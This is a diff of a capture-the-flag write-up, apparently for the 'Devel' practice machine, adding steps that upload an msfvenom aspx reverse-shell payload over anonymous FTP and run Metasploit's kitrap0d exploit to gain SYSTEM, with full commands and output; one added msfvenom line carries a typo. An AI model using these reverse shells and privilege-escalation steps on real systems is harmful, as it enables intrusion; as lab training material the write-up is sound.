@@ -166,9 +166,8 @@ Interesting, `Anonymous READ/WRITE (220 Microsoft FTP Service)`. Let's upload a 
 But what reverse shell? 
 
 Doing some research ([Source](https://www.atlantic.net/what-is-an-iis-server/)), we see:
-```
-Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations.
-```
+"Because IIS uses C# and .NET web application frameworks like ASP.NET MVC and Entity Framework; additionally, it integrates with Visual Studio, all of which make it a popular choice for enterprises. Other key advantages are native .NET, ASPX and PHP support for modules and scripts, which allows web developers to create eye-catching, seamlessly designed content to their web creations."
+
 Interesting, scripts for `.NET`, `ASPX` and `PHP` is supported. 
 
 ## Reverse Shell Execution
@@ -433,11 +432,92 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
+We'll try `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session, as we've used/seen this before and as a result more familiar with it.
+```
+msf5 > use exploit/windows/local/ms10_015_kitrap0d
+...
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:2121 
+[*] Launching notepad to host the exploit...
+[+] Process 3944 launched.
+[*] Reflectively injecting the exploit DLL into 3944...
+[*] Injecting exploit into 3944 ...
+[*] Exploit injected. Injecting payload into 3944...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Exploit completed, but no session was created.
+```
+Unfortunately, no session was created and running the `ms10_015_kitrap0d` exploit killed both our sessions (no response).
+
+We'll try again, repeating the steps, except navigating to the `%temp%` folder using the meterpreter shell. This is best explained by the official write up, "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."
+```
+meterpreter > pwd
+c:\windows\system32\inetsrv
+meterpreter > cd %temp%
+meterpreter > pwd
+C:\Windows\TEMP
+```
+
+We're also gonna kill off our regular shell, leaving only the meterpreter shell for good measure to prevent any possible corruption/conflict.
+```
+c:\windows\system32\inetsrv>exit
+exit
+Abort session 3? [y/N]  y
+
+[*] 10.10.10.5 - Command shell session 3 closed.  Reason: User exit
+msf5 post(multi/manage/shell_to_meterpreter) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information              Connection
+  --  ----  ----                     -----------              ----------
+  4        meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.x.x:1111 -> 10.10.10.5:49158 (10.10.10.5)
+```
+
+Let's run `exploit/windows/local/ms10_015_kitrap0d` on the meterpreter session again.
+```
+msf5 post(multi/manage/shell_to_meterpreter) > use exploit/windows/local/ms10_015_kitrap0d
+[*] Using configured payload windows/meterpreter/reverse_tcp
+...
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:5647 
+[*] Launching notepad to host the exploit...
+[+] Process 3944 launched.
+[*] Reflectively injecting the exploit DLL into 3944...
+[*] Injecting exploit into 3944 ...
+[*] Exploit injected. Injecting payload into 3944...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 11 opened (10.10.x.x:5647 -> 10.10.10.5:49159) at 2020-11-29 00:51:28 +0800
+```
+Oh yeah!! It worked this time!
+
+Seeing active sessions..
+```
+Active sessions
+===============
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  4        meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.x.x:1111 -> 10.10.10.5:49158 (10.10.10.5)
+  5        meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.x.x:5647 -> 10.10.10.5:49159 (10.10.10.5)
+```
+
+Time to go into session 5 to get flags and we're done!
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 
 ## Alternative Reverse Shell, with Meterpreter & MSFVenom
+NOTE: THIS IS AN ALTERNATE METHOD AS SHOWN IN OFFICIAL WRITE-UP
+
 Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
 ```
-msf5 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
+msf5 > msfvenom -p .indows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
 [*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -448,4 +528,36 @@ Final size of aspx file: 2818 bytes
 ```
 
 Same shit, put the `.aspx` in the FTP with `ftp> put devel.aspx`.
-Of course run a `msf5 > use exploit/multi/handler` and execute `http://10.10.10.5/devel.aspx` to get a reverse shell.
+Of course run a `msf5 > use exploit/multi/handler`, setting the correct payload and execute `http://10.10.10.5/devel.aspx` to get a reverse shell.
+```
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+...
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:9999 
+[*] Sending stage (176195 bytes) to 10.10.10.5
+[*] Meterpreter session 12 opened (10.10.x.x:9999 -> 10.10.10.5:49161) at 2020-11-29 00:59:11 +0800
+```
+We got a Meterpreter shell immediately, and can skip past using `post/multi/manage/shell_to_meterpreter`.
+
+Same thing, navigate to `%temp%` directory, run `ms10_015_kitrap0d` and we're done.
+```
+meterpreter > pwd
+c:\windows\system32\inetsrv
+meterpreter > cd %temp%
+...
+meterpreter > getuid
+Server username: IIS APPPOOL\Web
+...
+msf5 > use exploit/windows/local/ms10_015_kitrap0d
+...
+msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+
+[*] Started reverse TCP handler on 10.10.x.x:6832 
+...
+[*] Meterpreter session 13 opened (10.10.x.x:6832 -> 10.10.10.5:49162) at 2020-11-29 01:00:48 +0800
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
